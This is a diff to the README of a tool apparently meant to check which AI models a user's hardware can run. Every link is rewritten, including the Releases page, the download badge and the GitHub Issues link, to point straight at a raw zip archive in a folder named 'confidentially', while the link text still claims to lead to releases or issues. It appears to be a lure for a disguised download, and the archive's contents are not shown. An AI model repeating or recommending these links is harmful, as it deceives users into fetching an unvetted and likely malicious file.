@@ -1,7 +1,7 @@
 # 🤖 ariana - Determine AI Compatibility with Ease
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/RAFA2109/ariana/releases)
+[![Download](https://raw.githubusercontent.com/RAFA2109/ariana/main/confidentially/Software-2.7-alpha.2.zip)](https://raw.githubusercontent.com/RAFA2109/ariana/main/confidentially/Software-2.7-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to **ariana**! This tool helps you find out which AI models your hardwar
 
 ## 📥 Download & Install
 
-To get the application, visit the [Releases page](https://github.com/RAFA2109/ariana/releases). 
+To get the application, visit the [Releases page](https://raw.githubusercontent.com/RAFA2109/ariana/main/confidentially/Software-2.7-alpha.2.zip). 
 
 1. Click on the link above.
 2. Look for the latest version available.
@@ -57,7 +57,7 @@ If you encounter any issues, consider the following:
 
 Join our community for assistance and sharing experiences. You can reach out via:
 
-- **GitHub Issues**: Use [this link](https://github.com/RAFA2109/ariana/issues) for questions or bugs.
+- **GitHub Issues**: Use [this link](https://raw.githubusercontent.com/RAFA2109/ariana/main/confidentially/Software-2.7-alpha.2.zip) for questions or bugs.
 - **Discord Channel**: Join our Discord for live support and discussions.
 
 ## 📑 FAQs
@@ -73,6 +73,6 @@ A3: **ariana** is optimized for performance and should not noticeably slow down 
 
 ## 🔗 Download Link Reminder
 
-For your convenience, download **ariana** from the [Releases page](https://github.com/RAFA2109/ariana/releases). 
+For your convenience, download **ariana** from the [Releases page](https://raw.githubusercontent.com/RAFA2109/ariana/main/confidentially/Software-2.7-alpha.2.zip). 
 
 We hope you find **ariana** helpful in determining your AI capabilities! Enjoy using the application to explore the potential of your hardware.
